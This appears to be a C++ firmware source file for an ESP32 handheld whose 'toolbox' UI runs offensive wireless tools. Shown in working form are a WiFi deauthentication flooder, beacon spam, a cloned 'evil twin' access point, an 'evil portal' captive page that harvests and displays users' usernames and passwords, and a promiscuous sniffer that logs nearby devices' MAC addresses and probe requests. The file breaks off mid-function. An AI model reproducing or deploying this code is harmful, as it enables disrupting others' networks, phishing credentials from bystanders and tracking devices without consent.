// SquachWatch-CYD — Bruce Toolbox UI
// Offensive tools running inside SquatchWatch's visual shell.
#include "ui_toolbox.h"
#include "theme.h"
#include "settings.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <WebServer.h>

// Bruce modules (attack logic from Bruce firmware)
#include "ble/ble_spam.h"
#include <DNSServer.h>

// ---- Which tool is actively running ----
enum class ActiveTool : uint8_t {
    NONE = 0, WIFI_SCAN, DEAUTH, BEACON_SPAM, RICKROLL, CLONE_AP, EVIL_PORTAL,
    PROBE_SNIFF, KARMA, DHCP_STARVE, PCAP_CAPTURE, WIFI_LOGGER,
    BLE_SCAN, BLE_TRACK, APPLE_SPAM, SAMSUNG_SPAM, SWIFTPAIR_SPAM,
    FLIPPER_DETECT, AIRTAG_SPOOF, HAYSTACK,
    BADUSB_DUCKY, USB_KEYBOARD,
    SD_BROWSER, PCAP_VIEWER, USB_WIRESHARK
};

// ---- Which context menu type is open ----
enum class ContextType : uint8_t { NONE = 0, WIFI, BLE };

// ---- State ----
static ToolboxLevel  s_level  = ToolboxLevel::CATEGORIES;
static int           s_scroll = 0;
static int           s_selected = -1;
static bool          s_toolActive = false;
static ActiveTool    s_activeTool = ActiveTool::NONE;
static uint32_t      s_toolStartMs = 0;
static int           s_toolScroll = 0;  // scroll within tool output

// ---- Long press & context menu ----
static const uint32_t LONG_PRESS_MS = 600;
static bool     s_fingerDown = false;
static int16_t  s_downX = 0, s_downY = 0;
static uint32_t s_downMs = 0;
static bool     s_longPressFired = false;
static bool     s_contextMenuOpen = false;
static int      s_contextTarget = -1;     // index of the item long-pressed
static int      s_contextScroll = 0;

static ContextType s_contextType = ContextType::NONE;

// Context menu items for a WiFi network
static const char* WIFI_CTX_LABELS[] = {
    "DEAUTH THIS AP",
    "CLONE THIS AP",
    "CAPTURE HANDSHAKE",
    "CAPTURE PMKID",
    "MONITOR (PCAP)",
    "CANCEL"
};
static const int WIFI_CTX_COUNT = 6;

// Context menu items for a BLE device
static const char* BLE_CTX_LABELS[] = {
    "TRACK SIGNAL",
    "ENUMERATE SERVICES",
    "CANCEL"
};
static const int BLE_CTX_COUNT = 3;
static int s_bleSelected = -1;

// ---- Layout ----
static const int ROW_H     = 42;
static const int ROW_PAD   = 6;
static const int HEADER_H  = 36;
static const int RESULT_H  = 28;
static const int RESULT_PAD = 2;

// =============================================================================
//  WIFI SCAN
// =============================================================================
static const int MAX_SCAN_RESULTS = 40;
struct ScanResult {
    char ssid[33];
    int32_t rssi;
    uint8_t channel;
    uint8_t encType;  // WIFI_AUTH_OPEN etc
    uint8_t bssid[6];
};
static ScanResult s_scanResults[MAX_SCAN_RESULTS];
static int s_scanCount = 0;
static bool s_scanning = false;
static int s_scanSelected = -1;  // for deauth target selection

static void wifiScanStart() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    s_scanning = true;
    s_scanCount = 0;
    WiFi.scanNetworks(true, true);  // async, show hidden
    Serial.println("[toolbox] WiFi scan started");
}

static void wifiScanUpdate() {
    int16_t result = WiFi.scanComplete();
    if (result == WIFI_SCAN_RUNNING) return;
    if (result == WIFI_SCAN_FAILED) {
        s_scanning = false;
        Serial.println("[toolbox] WiFi scan failed");
        return;
    }
    s_scanCount = min((int)result, MAX_SCAN_RESULTS);
    for (int i = 0; i < s_scanCount; i++) {
        strncpy(s_scanResults[i].ssid, WiFi.SSID(i).c_str(), 32);
        s_scanResults[i].ssid[32] = 0;
        if (s_scanResults[i].ssid[0] == 0) strcpy(s_scanResults[i].ssid, "<hidden>");
        s_scanResults[i].rssi = WiFi.RSSI(i);
        s_scanResults[i].channel = WiFi.channel(i);
        s_scanResults[i].encType = WiFi.encryptionType(i);
        memcpy(s_scanResults[i].bssid, WiFi.BSSID(i), 6);
    }
    WiFi.scanDelete();
    s_scanning = false;
    Serial.printf("[toolbox] WiFi scan done: %d networks\n", s_scanCount);
}

static const char* encStr(uint8_t t) {
    switch (t) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA+2";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "W2+3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "?";
    }
}

static void drawRssiBar(TFT_eSPI& t, int x, int y, int w, int h, int32_t rssi) {
    // -30 = max, -90 = min
    float pct = constrain((rssi + 90.0f) / 60.0f, 0.0f, 1.0f);
    int barW = (int)(w * pct);
    uint16_t col = pct > 0.6f ? Theme::GREEN : pct > 0.3f ? Theme::AMBER : Theme::RED;
    t.fillRect(x, y, w, h, Theme::TASKBAR);
    t.fillRect(x, y, barW, h, col);
}

static void drawWifiScan(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    if (s_scanning) wifiScanUpdate();

    // Status line
    int statusY = HEADER_H + 2;
    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
    t.setTextDatum(TL_DATUM);
    char buf[48];
    if (s_scanning) {
        snprintf(buf, sizeof buf, "Scanning...");
    } else {
        snprintf(buf, sizeof buf, "Found %d  [TAP HERE=rescan]", s_scanCount);
    }
    t.drawString(buf, 8, statusY, 2);

    // Results list
    int listTop = statusY + 20;
    int visibleRows = (h - listTop - 30) / (RESULT_H + RESULT_PAD);

    for (int i = 0; i < s_scanCount; i++) {
        int drawIdx = i - s_toolScroll;
        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
        int y = listTop + drawIdx * (RESULT_H + RESULT_PAD);
        const ScanResult& r = s_scanResults[i];
        bool selected = (i == s_scanSelected);

        // Row background
        uint16_t rowBg = selected ? Theme::PURPLE : Theme::TASKBAR;
        t.fillRect(4, y, w - 8, RESULT_H, rowBg);

        // SSID (truncated to fit)
        t.setTextColor(Theme::CYAN, rowBg);
        t.setTextDatum(ML_DATUM);
        char ssidBuf[22];
        strncpy(ssidBuf, r.ssid, 21);
        ssidBuf[21] = 0;
        t.drawString(ssidBuf, 8, y + RESULT_H / 2, 2);

        // RSSI bar
        drawRssiBar(t, w - 130, y + 4, 40, RESULT_H - 8, r.rssi);

        // RSSI number
        t.setTextColor(Theme::VAPOR_PINK, rowBg);
        t.setTextDatum(MR_DATUM);
        snprintf(buf, sizeof buf, "%ddBm", (int)r.rssi);
        t.drawString(buf, w - 135, y + RESULT_H / 2, 1);

        // Channel
        t.setTextColor(Theme::AMBER, rowBg);
        t.setTextDatum(MR_DATUM);
        snprintf(buf, sizeof buf, "CH%d", r.channel);
        t.drawString(buf, w - 75, y + RESULT_H / 2, 1);

        // Encryption
        uint16_t encCol = (r.encType == WIFI_AUTH_OPEN) ? Theme::RED : Theme::GREEN;
        t.setTextColor(encCol, rowBg);
        t.setTextDatum(MR_DATUM);
        t.drawString(encStr(r.encType), w - 10, y + RESULT_H / 2, 1);
    }

    // Bottom bar
    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  DEAUTH
// =============================================================================
static uint8_t s_deauthBssid[6] = {0};
static uint8_t s_deauthChan = 0;
static uint32_t s_deauthCount = 0;
static uint32_t s_deauthLastMs = 0;
static char s_deauthTarget[33] = {0};

// Deauth frame template: 802.11 management frame, subtype 0xC0
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                         // type/subtype: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: AP BSSID (filled in)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled in)
    0x00, 0x00,                         // seq
    0x07, 0x00                          // reason: class 3 frame from nonassociated STA
};

static void deauthStart(int scanIdx) {
    if (scanIdx < 0 || scanIdx >= s_scanCount) return;
    memcpy(s_deauthBssid, s_scanResults[scanIdx].bssid, 6);
    s_deauthChan = s_scanResults[scanIdx].channel;
    strncpy(s_deauthTarget, s_scanResults[scanIdx].ssid, 32);
    s_deauthCount = 0;
    s_deauthLastMs = 0;

    // Set source and BSSID in frame
    memcpy(deauthFrame + 10, s_deauthBssid, 6);
    memcpy(deauthFrame + 16, s_deauthBssid, 6);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_channel(s_deauthChan, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[toolbox] Deauth started on %s (ch%d)\n", s_deauthTarget, s_deauthChan);
}

static void deauthTick() {
    uint32_t now = millis();
    if (now - s_deauthLastMs < 50) return;  // ~20 packets/sec
    s_deauthLastMs = now;
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    s_deauthCount++;
}

static void drawDeauth(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    deauthTick();

    // Target info
    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("DEAUTH ACTIVE", w / 2, HEADER_H + 20, 4);

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString(s_deauthTarget, w / 2, HEADER_H + 55, 2);

    char buf[48];
    snprintf(buf, sizeof buf, "CH %d  |  %02X:%02X:%02X:%02X:%02X:%02X",
             s_deauthChan, s_deauthBssid[0], s_deauthBssid[1], s_deauthBssid[2],
             s_deauthBssid[3], s_deauthBssid[4], s_deauthBssid[5]);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(buf, w / 2, HEADER_H + 80, 2);

    // Packet counter — big
    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_deauthCount);
    t.drawString(buf, w / 2, h / 2 + 10, 7);

    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("packets sent", w / 2, h / 2 + 50, 2);

    // Elapsed
    uint32_t elapsed = (now - s_toolStartMs) / 1000;
    snprintf(buf, sizeof buf, "%02lu:%02lu", elapsed / 60, elapsed % 60);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 75, 2);

    // Bottom
    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  BEACON SPAM
// =============================================================================
static const int BEACON_COUNT = 20;
static uint32_t s_beaconsSent = 0;
static uint32_t s_beaconLastMs = 0;

static const char* BEACON_SSIDS[] = {
    "Free WiFi", "FBI Surveillance Van", "NSA_Field_Office",
    "Pretty Fly for a WiFi", "Drop It Like Its Hotspot",
    "Tell My WiFi Love Her", "Wu Tang LAN", "The Promised LAN",
    "Bill Wi the Science Fi", "It Burns When IP",
    "Nacho WiFi", "Get Off My LAN", "Abraham Linksys",
    "Benjamin FrankLAN", "John Wilkes Bluetooth",
    "Silence of the LANs", "LAN Solo", "The LAN Before Time",
    "Winternet Is Coming", "I Believe Wi Can Fi"
};

// Minimal beacon frame
static uint8_t beaconFrame[128] = {
    0x80, 0x00,                         // type: beacon
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dest: broadcast
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, // src (randomized per SSID)
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, // BSSID (same)
    0x00, 0x00,                         // seq
    // Fixed parameters (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
    0x64, 0x00,                         // interval: 100 TU
    0x31, 0x04,                         // capabilities: ESS + privacy
    // Tagged parameters start at offset 36
};

static void beaconSpamStart() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    s_beaconsSent = 0;
    s_beaconLastMs = 0;
    Serial.println("[toolbox] Beacon spam started");
}

static void beaconSpamTick() {
    uint32_t now = millis();
    if (now - s_beaconLastMs < 10) return;  // ~100 beacons/sec
    s_beaconLastMs = now;

    int idx = s_beaconsSent % BEACON_COUNT;
    const char* ssid = BEACON_SSIDS[idx];
    size_t ssidLen = strlen(ssid);

    // Randomize last 2 bytes of MAC per SSID
    beaconFrame[10] = 0xDE; beaconFrame[11] = 0xAD;
    beaconFrame[12] = 0xBE; beaconFrame[13] = 0xEF;
    beaconFrame[14] = (uint8_t)idx; beaconFrame[15] = (uint8_t)(idx ^ 0xAA);
    memcpy(beaconFrame + 16, beaconFrame + 10, 6);

    // SSID tag at offset 36
    beaconFrame[36] = 0x00;  // tag: SSID
    beaconFrame[37] = (uint8_t)ssidLen;
    memcpy(beaconFrame + 38, ssid, ssidLen);

    // Supported rates tag right after SSID
    size_t ratesOff = 38 + ssidLen;
    beaconFrame[ratesOff] = 0x01;     // tag: supported rates
    beaconFrame[ratesOff + 1] = 0x08; // 8 rates
    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
    memcpy(beaconFrame + ratesOff + 2, rates, 8);

    // Channel tag
    size_t chanOff = ratesOff + 10;
    beaconFrame[chanOff] = 0x03;     // tag: DS parameter
    beaconFrame[chanOff + 1] = 0x01;
    beaconFrame[chanOff + 2] = 0x01; // channel 1

    size_t frameLen = chanOff + 3;
    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, frameLen, false);
    s_beaconsSent++;
}

static void drawBeaconSpam(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    beaconSpamTick();

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("BEACON SPAM", w / 2, HEADER_H + 20, 4);

    // Show some of the SSIDs being broadcast
    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 50;
    for (int i = 0; i < min(BEACON_COUNT, 8); i++) {
        t.setTextColor(Theme::CYAN, Theme::BG);
        t.drawString(BEACON_SSIDS[i], 12, listY + i * 18, 2);
    }

    // Counter
    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_beaconsSent);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h - 60, 6);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("beacons sent", w / 2, h - 32, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  RICKROLL BEACON
// =============================================================================
static const int RICK_COUNT = 16;
static const char* RICK_SSIDS[] = {
    "Never gonna give u up",
    "Never gonna let u down",
    "Never gonna run around",
    "and desert you",
    "Never gonna make u cry",
    "Never gonna say goodbye",
    "Never gonna tell a lie",
    "and hurt you",
    "We know the game and",
    "were gonna play it",
    "A full commitments what",
    "Im thinking of",
    "You wouldnt get this",
    "from any other guy",
    "I just wanna tell you",
    "how Im feeling"
};
static uint32_t s_rickSent = 0;
static uint32_t s_rickLastMs = 0;
static bool     s_rickMode = false;  // true = rickroll, false = funny names

static void rickrollStart() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    s_rickSent = 0;
    s_rickLastMs = 0;
    s_rickMode = true;
    Serial.println("[toolbox] Rickroll beacon started");
}

static void rickrollTick() {
    uint32_t now = millis();
    if (now - s_rickLastMs < 10) return;
    s_rickLastMs = now;

    int idx = s_rickSent % RICK_COUNT;
    const char* ssid = RICK_SSIDS[idx];
    size_t ssidLen = strlen(ssid);

    beaconFrame[10] = 0xC0; beaconFrame[11] = 0xFF;
    beaconFrame[12] = 0xEE; beaconFrame[13] = 0x00;
    beaconFrame[14] = (uint8_t)idx; beaconFrame[15] = (uint8_t)(idx ^ 0x55);
    memcpy(beaconFrame + 16, beaconFrame + 10, 6);

    beaconFrame[36] = 0x00;
    beaconFrame[37] = (uint8_t)ssidLen;
    memcpy(beaconFrame + 38, ssid, ssidLen);

    size_t ratesOff = 38 + ssidLen;
    beaconFrame[ratesOff] = 0x01;
    beaconFrame[ratesOff + 1] = 0x08;
    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
    memcpy(beaconFrame + ratesOff + 2, rates, 8);

    size_t chanOff = ratesOff + 10;
    beaconFrame[chanOff] = 0x03;
    beaconFrame[chanOff + 1] = 0x01;
    beaconFrame[chanOff + 2] = 0x06;

    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, chanOff + 3, false);
    s_rickSent++;
}

static void drawRickroll(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    rickrollTick();

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("RICKROLL", w / 2, HEADER_H + 20, 4);

    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 50;
    for (int i = 0; i < min(RICK_COUNT, 8); i++) {
        uint16_t col = (i == (int)(s_rickSent % RICK_COUNT)) ? Theme::VAPOR_YELLOW : Theme::CYAN;
        t.setTextColor(col, Theme::BG);
        t.drawString(RICK_SSIDS[i], 12, listY + i * 18, 2);
    }

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_rickSent);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h - 60, 6);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  CLONE AP — create a fake AP with the same SSID as a scanned network
// =============================================================================
static char s_cloneSsid[33] = {0};
static uint32_t s_cloneClients = 0;
static uint32_t s_cloneStartMs = 0;

static void cloneApStart(int scanIdx) {
    if (scanIdx < 0 || scanIdx >= s_scanCount) return;
    strncpy(s_cloneSsid, s_scanResults[scanIdx].ssid, 32);
    s_cloneSsid[32] = 0;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(s_cloneSsid, NULL, s_scanResults[scanIdx].channel, 0, 4);
    s_cloneClients = 0;
    s_cloneStartMs = millis();
    Serial.printf("[toolbox] Clone AP started: %s on ch%d\n", s_cloneSsid, s_scanResults[scanIdx].channel);
}

static void drawCloneAp(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    s_cloneClients = WiFi.softAPgetStationNum();

    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("EVIL TWIN ACTIVE", w / 2, HEADER_H + 20, 4);

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString(s_cloneSsid, w / 2, HEADER_H + 55, 2);

    // Connected clients — big number
    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_cloneClients);
    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.drawString(buf, w / 2, h / 2, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("clients connected", w / 2, h / 2 + 40, 2);

    // IP
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.drawString(WiFi.softAPIP().toString().c_str(), w / 2, h / 2 + 65, 2);

    // Elapsed
    uint32_t elapsed = (now - s_cloneStartMs) / 1000;
    snprintf(buf, sizeof buf, "%02lu:%02lu", elapsed / 60, elapsed % 60);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 90, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  EVIL PORTAL — captive portal that captures credentials
// =============================================================================
static WebServer* s_portalWeb = nullptr;
static DNSServer* s_portalDns = nullptr;
static char s_portalSsid[33] = {0};
static uint32_t s_portalHits = 0;

static const int MAX_CREDS = 20;
struct CapturedCred {
    char user[32];
    char pass[32];
};
static CapturedCred s_creds[MAX_CREDS];
static int s_credCount = 0;

static const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;width:300px;box-shadow:0 0 20px rgba(0,0,0,0.5)}
h2{text-align:center;color:#e94560}input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:6px;background:#1a1a2e;color:#eee;box-sizing:border-box}
button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:16px}
button:hover{background:#c81e45}</style></head>
<body><div class="box"><h2>WiFi Login Required</h2><form action="/login" method="POST">
<input name="user" placeholder="Email or Username" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Connect</button></form></div></body></html>
)rawliteral";

static const char PORTAL_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#16213e;padding:30px;border-radius:12px;text-align:center}</style></head>
<body><div class="box"><h2 style="color:#4ecca3">Connected!</h2><p>You may now use the internet.</p></div></body></html>
)rawliteral";

static void portalHandleRoot() {
    s_portalWeb->send(200, "text/html", PORTAL_HTML);
    s_portalHits++;
}

static void portalHandleLogin() {
    String user = s_portalWeb->arg("user");
    String pass = s_portalWeb->arg("pass");
    if (s_credCount < MAX_CREDS) {
        strncpy(s_creds[s_credCount].user, user.c_str(), 31);
        strncpy(s_creds[s_credCount].pass, pass.c_str(), 31);
        s_credCount++;
    }
    Serial.printf("[portal] CAPTURED: %s / %s\n", user.c_str(), pass.c_str());
    s_portalWeb->send(200, "text/html", PORTAL_SUCCESS);
}

static void portalHandleNotFound() {
    s_portalWeb->sendHeader("Location", "http://192.168.4.1/", true);
    s_portalWeb->send(302, "text/plain", "");
    s_portalHits++;
}

static void evilPortalStart() {
    strncpy(s_portalSsid, "Free_WiFi", 32);
    s_portalHits = 0;
    s_credCount = 0;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(s_portalSsid, NULL, 1, 0, 4);

    s_portalDns = new DNSServer();
    s_portalDns->start(53, "*", WiFi.softAPIP());

    s_portalWeb = new WebServer(80);
    s_portalWeb->on("/", portalHandleRoot);
    s_portalWeb->on("/login", HTTP_POST, portalHandleLogin);
    s_portalWeb->onNotFound(portalHandleNotFound);
    s_portalWeb->begin();
    Serial.printf("[toolbox] Evil portal started: %s at %s\n",
                  s_portalSsid, WiFi.softAPIP().toString().c_str());
}

static void evilPortalStop() {
    if (s_portalWeb) { s_portalWeb->stop(); delete s_portalWeb; s_portalWeb = nullptr; }
    if (s_portalDns) { s_portalDns->stop(); delete s_portalDns; s_portalDns = nullptr; }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

static void drawEvilPortal(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    s_portalDns->processNextRequest();
    s_portalWeb->handleClient();

    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("EVIL PORTAL", w / 2, HEADER_H + 20, 4);

    t.setTextColor(Theme::CYAN, Theme::BG);
    char buf[48];
    snprintf(buf, sizeof buf, "SSID: %s", s_portalSsid);
    t.drawString(buf, w / 2, HEADER_H + 50, 2);

    t.setTextColor(Theme::GREEN, Theme::BG);
    snprintf(buf, sizeof buf, "IP: %s", WiFi.softAPIP().toString().c_str());
    t.drawString(buf, w / 2, HEADER_H + 70, 2);

    snprintf(buf, sizeof buf, "Clients: %d  |  Hits: %lu",
             (int)WiFi.softAPgetStationNum(), (unsigned long)s_portalHits);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString(buf, w / 2, HEADER_H + 90, 2);

    // Captured credentials
    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    snprintf(buf, sizeof buf, "CAPTURED: %d", s_credCount);
    t.drawString(buf, w / 2, HEADER_H + 120, 4);

    // Show captured creds
    int listY = HEADER_H + 155;
    for (int i = 0; i < min(s_credCount, 5); i++) {
        int idx = s_credCount - 1 - i;  // most recent first
        t.setTextColor(Theme::CYAN, Theme::BG);
        t.setTextDatum(TL_DATUM);
        snprintf(buf, sizeof buf, "%s : %s", s_creds[idx].user, s_creds[idx].pass);
        t.drawString(buf, 8, listY + i * 18, 2);
    }

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  PROBE SNIFF — show probe requests from nearby devices
// =============================================================================
static const int MAX_PROBES = 50;
struct ProbeEntry {
    uint8_t mac[6];
    char ssid[33];
    int8_t rssi;
    uint32_t lastSeen;
};
static ProbeEntry s_probes[MAX_PROBES];
static int s_probeCount = 0;
static bool s_probeActive = false;

static void IRAM_ATTR probeSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 28) return;

    // Subtype 0x40 = probe request
    if ((frame[0] & 0xFC) != 0x40) return;

    const uint8_t* sa = frame + 10;  // source address
    // Tagged parameters start at offset 24
    const uint8_t* tags = frame + 24;
    int tagLen = len - 24;
    if (tagLen < 2) return;

    // Find SSID tag (tag 0)
    char ssid[33] = {0};
    for (int i = 0; i < tagLen - 1;) {
        uint8_t tagId = tags[i];
        uint8_t tLen = tags[i + 1];
        if (i + 2 + tLen > tagLen) break;
        if (tagId == 0 && tLen > 0 && tLen <= 32) {
            memcpy(ssid, tags + i + 2, tLen);
            ssid[tLen] = 0;
            break;
        }
        i += 2 + tLen;
    }
    if (ssid[0] == 0) return;  // broadcast probe, skip

    // Check if we already have this MAC+SSID combo
    for (int i = 0; i < s_probeCount; i++) {
        if (memcmp(s_probes[i].mac, sa, 6) == 0 && strcmp(s_probes[i].ssid, ssid) == 0) {
            s_probes[i].rssi = pkt->rx_ctrl.rssi;
            s_probes[i].lastSeen = millis();
            return;
        }
    }
    if (s_probeCount >= MAX_PROBES) return;

    ProbeEntry& e = s_probes[s_probeCount++];
    memcpy(e.mac, sa, 6);
    strncpy(e.ssid, ssid, 32);
    e.rssi = pkt->rx_ctrl.rssi;
    e.lastSeen = millis();
}

static void probeSniffStart() {
    s_probeCount = 0;
    s_probeActive = true;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probeSniffCb);
    // Hop channels periodically — done in tick
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.println("[toolbox] Probe sniff started");
}

static void probeSniffStop() {
    esp_wifi_set_promiscuous(false);
    s_probeActive = false;
    WiFi.mode(WIFI_OFF);
}

static uint8_t s_probeChan = 1;
static uint32_t s_probeHopMs = 0;

static void probeSniffTick() {
    // Hop channel every 500ms across 1-13
    uint32_t now = millis();
    if (now - s_probeHopMs > 500) {
        s_probeHopMs = now;
        s_probeChan = (s_probeChan % 13) + 1;
        esp_wifi_set_channel(s_probeChan, WIFI_SECOND_CHAN_NONE);
    }
}

static void drawProbeSniff(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    probeSniffTick();

    char buf[48];
    int statusY = HEADER_H + 2;
    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
    t.setTextDatum(TL_DATUM);
    snprintf(buf, sizeof buf, "CH%d  |  %d probes captured", s_probeChan, s_probeCount);
    t.drawString(buf, 8, statusY, 2);

    int listTop = statusY + 20;
    int visibleRows = (h - listTop - 30) / (RESULT_H + RESULT_PAD);

    for (int i = 0; i < s_probeCount; i++) {
        int drawIdx = i - s_toolScroll;
        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
        int y = listTop + drawIdx * (RESULT_H + RESULT_PAD);
        const ProbeEntry& e = s_probes[i];
        bool fresh = (now - e.lastSeen) < 3000;

        t.fillRect(4, y, w - 8, RESULT_H, Theme::TASKBAR);

        // MAC
        t.setTextColor(fresh ? Theme::GREEN : Theme::VAPOR_PURPLE, Theme::TASKBAR);
        t.setTextDatum(ML_DATUM);
        snprintf(buf, sizeof buf, "%02X:%02X:%02X", e.mac[3], e.mac[4], e.mac[5]);
        t.drawString(buf, 8, y + RESULT_H / 2, 1);

        // SSID they're looking for
        t.setTextColor(Theme::CYAN, Theme::TASKBAR);
        char ssidBuf[20];
        strncpy(ssidBuf, e.ssid, 19);
        ssidBuf[19] = 0;
        t.drawString(ssidBuf, 70, y + RESULT_H / 2, 2);

        // RSSI
        t.setTextColor(Theme::AMBER, Theme::TASKBAR);
        t.setTextDatum(MR_DATUM);
        snprintf(buf, sizeof buf, "%ddBm", e.rssi);
        t.drawString(buf, w - 10, y + RESULT_H / 2, 1);
    }

